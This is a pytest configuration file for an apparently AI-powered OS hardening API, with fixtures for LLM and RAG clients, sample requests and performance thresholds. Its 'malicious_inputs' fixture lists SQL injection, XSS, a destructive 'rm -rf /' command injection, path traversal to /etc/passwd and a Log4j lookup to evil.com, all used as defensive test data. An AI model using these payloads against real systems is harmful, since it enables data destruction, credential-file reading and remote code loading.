"""
Pytest Configuration and Shared Fixtures
Professional Test Suite - AI-Powered OS Hardening
"""

import pytest
import sys
import os
from pathlib import Path
from typing import Generator, Dict, Any
from fastapi.testclient import TestClient

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))


# ============================================================================
# Application Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def app():
    """FastAPI application instance (session-scoped)"""
    from main import app
    return app


@pytest.fixture(scope="function")
def client(app) -> Generator[TestClient, None, None]:
    """Test client for API testing (function-scoped)"""
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture(scope="session")
def base_url() -> str:
    """Base URL for API"""
    return "http://localhost:8000"


# ============================================================================
# Configuration Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def config():
    """Application configuration"""
    from config.config_loader import get_config
    return get_config()


@pytest.fixture(scope="function")
def test_config() -> Dict[str, Any]:
    """Test-specific configuration"""
    return {
        "security_level": "balanced",
        "zt_maturity": "medium",
        "os": "ubuntu_24_04",
        "role": "sysadmin",
        "use_rag": True,
        "rag_top_k": 5,
        "rag_min_score": 0.7,
        "timeout": 60
    }


# ============================================================================
# LLM Client Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def llm_clients():
    """LLM clients (small and large models)"""
    from llm.clients import get_llm_clients
    return get_llm_clients()


@pytest.fixture(scope="session")
def llm_small(llm_clients):
    """Small LLM client for fast operations"""
    return llm_clients[0]


@pytest.fixture(scope="session")
def llm_large(llm_clients):
    """Large LLM client for complex operations"""
    return llm_clients[1]


# ============================================================================
# RAG System Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def rag_retriever():
    """RAG retriever instance"""
    from core.retrieval.rag_retriever import RAGRetriever
    return RAGRetriever()


# ============================================================================
# ML Model Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def intent_detector():
    """ML Intent detector"""
    from llm.ml.intent_detector import IntentDetector
    return IntentDetector()


# ============================================================================
# Test Data Fixtures
# ============================================================================

@pytest.fixture
def sample_questions() -> Dict[str, str]:
    """Sample questions for different intents"""
    return {
        "greeting": "Hello there!",
        "thanks": "Thank you very much!",
        "farewell": "Goodbye!",
        "help": "Can you help me?",
        "info_request": "What are SSH hardening best practices?",
        "action_request": "Generate a bash script to configure firewall",
        "out_of_scope": "What is the capital of France?"
    }


@pytest.fixture
def sample_rag_queries() -> list[str]:
    """Sample RAG queries"""
    return [
        "firewall configuration",
        "SSH security best practices",
        "password policy requirements",
        "audit logging configuration",
        "file permissions hardening"
    ]


@pytest.fixture
def valid_chat_request() -> Dict[str, Any]:
    """Valid chat request payload"""
    return {
        "question": "How to harden SSH on Ubuntu 24.04?",
        "os": "ubuntu_24_04",
        "role": "sysadmin",
        "security_level": "balanced",
        "zt_maturity": "medium",
        "use_rag": True,
        "rag_top_k": 5,
        "rag_min_score": 0.7,
        "stream": False,
        "timeout": 60
    }


@pytest.fixture
def invalid_chat_requests() -> list[Dict[str, Any]]:
    """Invalid chat request payloads for validation testing"""
    return [
        {},  # Empty request
        {"question": ""},  # Empty question
        {"question": "a" * 5001},  # Too long
        {"question": "test", "security_level": "invalid"},  # Invalid security level
        {"question": "test", "zt_maturity": "super_high"},  # Invalid ZT maturity
        {"question": "test", "rag_top_k": 50},  # Invalid top_k (>20)
        {"question": "test", "rag_min_score": -0.5},  # Negative score
        {"question": "test", "timeout": 500},  # Timeout too high
    ]


# ============================================================================
# Mock Fixtures
# ============================================================================

@pytest.fixture
def mock_llm_response():
    """Mock LLM response for testing"""
    return {
        "content": "This is a test response about SSH hardening.",
        "model": "test-model",
        "tokens": 50
    }


@pytest.fixture
def mock_rag_results():
    """Mock RAG search results"""
    return [
        {
            "id": "cis_ubuntu_24_04-p100-c0",
            "score": 0.85,
            "text": "SSH configuration best practices include...",
            "metadata": {"source": "CIS Benchmark", "section": "5.2"}
        },
        {
            "id": "cis_ubuntu_24_04-p101-c0",
            "score": 0.78,
            "text": "Disable root login for enhanced security...",
            "metadata": {"source": "CIS Benchmark", "section": "5.2.1"}
        }
    ]


# ============================================================================
# Cleanup Fixtures
# ============================================================================

@pytest.fixture(autouse=True)
def cleanup_after_test():
    """Auto cleanup after each test"""
    yield
    # Cleanup code here if needed (e.g., clear caches, reset state)


# ============================================================================
# Performance Testing Fixtures
# ============================================================================

@pytest.fixture
def performance_thresholds() -> Dict[str, float]:
    """Performance thresholds for various operations"""
    return {
        "pattern_response": 0.1,  # 100ms
        "simple_info": 2.0,  # 2s
        "complex_info": 5.0,  # 5s
        "rag_search": 10.0,  # 10s
        "action_request": 5.0,  # 5s
    }


# ============================================================================
# Security Testing Fixtures
# ============================================================================

@pytest.fixture
def malicious_inputs() -> list[str]:
    """Malicious inputs for security testing"""
    return [
        "'; DROP TABLE users; --",  # SQL injection
        "<script>alert('XSS')</script>",  # XSS
        "$(rm -rf /)",  # Command injection
        "../../../etc/passwd",  # Path traversal
        "' OR '1'='1",  # SQL injection variant
        "${jndi:ldap://evil.com/a}",  # Log4j
    ]


# ============================================================================
# Pytest Hooks
# ============================================================================

def pytest_configure(config):
    """Pytest configuration hook"""
    # Create reports directory if it doesn't exist
    reports_dir = Path("tests/reports")
    reports_dir.mkdir(exist_ok=True, parents=True)


def pytest_collection_modifyitems(config, items):
    """Modify test collection"""
    # Add markers to tests based on their location
    for item in items:
        # Add markers based on test path
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "blackbox" in str(item.fspath):
            item.add_marker(pytest.mark.blackbox)
        elif "whitebox" in str(item.fspath):
            item.add_marker(pytest.mark.whitebox)
        elif "e2e" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        elif "performance" in str(item.fspath):
            item.add_marker(pytest.mark.performance)

        # Add API marker for API tests
        if "api" in str(item.fspath) or "router" in str(item.nodeid):
            item.add_marker(pytest.mark.api)

        # Add LLM marker for LLM tests
        if "llm" in str(item.fspath) or "pipeline" in str(item.nodeid):
            item.add_marker(pytest.mark.llm)

        # Add RAG marker for RAG tests
        if "rag" in str(item.fspath) or "rag" in str(item.nodeid):
            item.add_marker(pytest.mark.rag)


def pytest_report_header(config):
    """Add custom header to test report"""
    return [
        "AI-Powered OS Hardening - Professional Test Suite",
        "=" * 80,
        "Test Categories: Unit, Integration, Black-box, White-box, E2E, Performance",
        "Coverage Target: 80%+",
        "=" * 80,
    ]


def pytest_terminal_summary(terminalreporter, exitstatus, config):
    """Add custom summary to terminal output"""
    if exitstatus == 0:
        terminalreporter.write_sep("=", "ALL TESTS PASSED", green=True, bold=True)
    else:
        terminalreporter.write_sep("=", "SOME TESTS FAILED", red=True, bold=True)
